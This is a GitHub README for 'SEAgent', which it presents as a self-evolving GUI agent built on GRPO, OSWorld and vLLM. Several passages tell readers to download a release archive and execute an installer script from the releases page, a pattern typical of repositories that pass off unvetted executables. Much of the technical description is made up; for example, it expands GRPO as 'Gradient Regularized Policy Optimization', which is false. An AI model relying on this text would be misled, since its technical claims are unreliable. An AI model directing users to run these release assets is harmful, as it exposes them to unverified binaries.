https://github.com/shiva129stha/SEAgent/releases

[![Download Releases](https://img.shields.io/badge/Download-SEAgent%20Releases-blue?logo=github&style=for-the-badge)](https://github.com/shiva129stha/SEAgent/releases)

# SEAgent — Self-Evolving Use Agent with Autonomous Learning

🚀 A research-grade agent that learns by using a GUI, an OS-like world, and reinforcement learning. SEAgent models how a computer-use agent grows skills from raw interaction. It blends GRPO-style policy updates, an environment called OSWorld, and modern language model inference via vLLM for planning and high-level actions.

![SEAgent GUI concept](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)

Table of contents
- What SEAgent is
- Key features
- High-level architecture
- Requirements
- Releases and quick install
- Basic usage
- Core components
  - OSWorld environment
  - GRPO policy core
  - GUI agent and screen-based actions
  - vLLM integration
  - Experience buffer and self-evolution
- Training and evaluation
- Common commands
- Configuration
- Logs and debugging
- Contributing
- License
- References and further reading

What SEAgent is
- An agent that acts in a desktop-like environment.
- It learns from experience with RL updates that adapt the policy and models.
- It includes a GUI stack to simulate windows, inputs, and application behaviors.
- It provides a pipeline for collecting episodes, training policies, and evaluating transfer.

Key features
- Task-driven GUI control: move, click, type, select windows, drag.
- OSWorld: a sandbox that emulates file system, processes, windows, and app events.
- GRPO-based policy updates: gradient-regularized policy optimization designed for long-horizon GUI tasks.
- vLLM inference: use a large language model as a planner or action generator.
- Self-evolving loop: offline replay, online fine-tune, and automated curriculum.
- Visual recorder and replay for debugging.
- Modular: swap the policy, environment, or model easily.

High-level architecture
- Input: pixels, window metadata, keyboard state.
- Perception: simple CNN encoder plus object detectors for UI elements.
- Planner: vLLM prompt module produces candidate goals or subroutines.
- Policy: GRPO actor that maps states and prompts to actions.
- Environment: OSWorld applies actions, returns reward and next state.
- Learning: policy updates, model updates, and experience replay.

Requirements
- Python 3.10+
- GPU with CUDA 11+ for training (optional for small tests)
- vLLM-compatible model weights if using language planning
- Common packages: torch, numpy, Pillow, OpenCV, gym-like API
- A releases asset from the releases page (see below)

Releases and quick install
- Download the release asset and execute it from the releases page:
  https://github.com/shiva129stha/SEAgent/releases

[![Releases](https://img.shields.io/badge/Releases-Assets-green?logo=github&style=for-the-badge)](https://github.com/shiva129stha/SEAgent/releases)

- From the Releases page, download the asset that matches your OS. The common files:
  - SEAgent-v1.0-linux-x86_64.tar.gz
  - SEAgent-v1.0-macos.zip
  - SEAgent-v1.0-windows.zip
  - seagent_install.sh (installer wrapper)

- After downloading, run the installer for your platform. Example for Linux:
```bash
# file downloaded from the Releases page
tar -xzf SEAgent-v1.0-linux-x86_64.tar.gz
cd SEAgent-v1.0
chmod +x seagent_install.sh
./seagent_install.sh
```

- The installer will create a virtualenv, install dependencies, and place a `seagent` CLI in PATH. If the release asset or the install script fails, check the Releases section on GitHub for the correct file and version:
  https://github.com/shiva129stha/SEAgent/releases

Basic usage
- Launch the GUI sandbox:
```bash
seagent start --env osworld --gpu 0
```
- Run a demo episode with a bundled policy:
```bash
seagent run-demo --policy bundled --episodes 5 --render
```
- Train a policy from collected data:
```bash
seagent train --config configs/grpo_default.yaml --gpus 1
```

Core components

OSWorld environment
- A deterministic sandbox that simulates windows, widgets, file trees, and processes.
- State includes screenshot images, a DOM-like widget list, and low-level input state.
- Rewards come from task completion, heuristics, and intrinsic curiosity signals.
- You can plug the environment into standard RL loops. API mirrors gym concepts: reset(), step(action), render().

GRPO policy core
- GRPO stands for Gradient Regularized Policy Optimization. It keeps updates stable for long multi-step GUI tasks.
- The codebase provides actor, critic, and regularizer modules.
- The policy accepts mixed inputs: pixel encodings and semantic prompts from vLLM.

GUI agent and screen-based actions
- Actions include pointer move, click, drag, key presses, and higher-level app commands.
- The agent uses a hybrid action space: discrete commands and continuous pointer coordinates.
- A detection module converts GUI elements into tokens the policy can use.

vLLM integration
- vLLM acts as a planner that suggests subgoals, scripts, or action sequences.
- The README includes prompt templates in `prompts/` for common tasks.
- The integration supports two modes:
  - Synchronous planning: query vLLM each step for the next subgoal.
  - Asynchronous planning: generate a script of steps to run in the environment.

Experience buffer and self-evolution
- SEAgent stores episodes in a replay buffer with metadata: state, action, reward, success flags, and vLLM prompts.
- An automated scheduler selects older episodes for replay and new ones for exploration.
- Self-evolution happens via scheduled policy retrains and curriculum updates based on performance.

Training and evaluation
- Use `seagent train` with a YAML config. A minimal config lives in `configs/grpo_default.yaml`.
- Training yields checkpoints in `runs/<experiment>/checkpoints`.
- Evaluation metrics:
  - Success rate per task.
  - Mean episode return.
  - Steps to completion.
  - Transfer score on held-out tasks.
- Use `seagent eval --checkpoint PATH --tasks tasks/` to run evaluations.

Example config snippet (grpo_default.yaml)
```yaml
env: osworld
policy:
  type: grpo
  encoder: small_cnn
  hidden: 512
trainer:
  batch_size: 64
  epochs: 10
  gamma: 0.99
vllm:
  enabled: true
  model: local-7b
replay:
  size: 50000
  prioritized: true
```

Common commands
- Start sandbox: seagent start --env osworld
- Run demo: seagent run-demo --policy bundled
- Collect data: seagent collect --episodes 100 --policy random
- Train: seagent train --config configs/grpo_default.yaml
- Resume training: seagent train --resume runs/myexp/checkpoints/ckpt.pt
- Evaluate: seagent eval --checkpoint runs/myexp/checkpoints/ckpt.pt

Configuration
- All runtime settings live in `configs/`. Use YAML to customize:
  - environment parameters (screen size, apps)
  - reward shaping
  - policy network sizes
  - vLLM prompt variants and model paths
- Use `seagent config-validate configs/myconfig.yaml` to check keys.

Logs and debugging
- All runs write logs to `runs/<experiment>/logs` with structured JSON and TensorBoard-compatible summaries.
- GUI recorder saves screenshot traces in `runs/<experiment>/replays` for replay in the viewer.
- Use `seagent view-replay runs/myexp/replays/episode_0001.json` to step through a recorded episode.

Integration points
- Replace the vLLM module with your LLM endpoint via `vllm` adapter interface.
- Swap the encoder with your own vision model by subclassing `encoders.BaseEncoder`.
- Add tasks by writing `tasks/*.yaml`. Each task specifies initial state, goal, and success predicate.

Debugging tips
- If a policy diverges, reduce learning rate and regularizer strength.
- If actions look jittery, increase action smoothing in the policy config.
- If vLLM plans mismatch GUI state, check the prompt context length and include element DOM tokens.

Contributing
- Fork, add tests, open a PR. We use GitHub Actions for CI.
- Run unit tests:
```bash
pytest tests/
```
- Add integration tests for new environments under `tests/integration/`.
- Use `pre-commit` to format code. A hook config appears in `.pre-commit-config.yaml`.

Ecosystem and topics
- agent
- computer-use-agent
- grpo
- gui-agent
- osworld
- rl
- self-evolving-systems
- vllm

Assets and images
- The repo contains sample snapshots and diagrams in `assets/`.
- Use the GUI screenshot recorder to create your own demo images.

Security
- The installer creates a virtual environment and keeps runtime sandboxes separate from host processes.
- If you run external model weights, use standard model vetting.

License
- The repository uses the MIT License. See LICENSE for details.

References and further reading
- GRPO algorithm paper (look up gradient-regularized policy optimization).
- vLLM docs for model integration and prompt design.
- Research literature on interactive agents and human-computer interaction.

Contact and support
- Use Issues for bugs and feature requests.
- For release downloads, visit:
  https://github.com/shiva129stha/SEAgent/releases

Screenshots, example runs, and prebuilt assets live on the Releases page and in the `assets/` folder of the repository.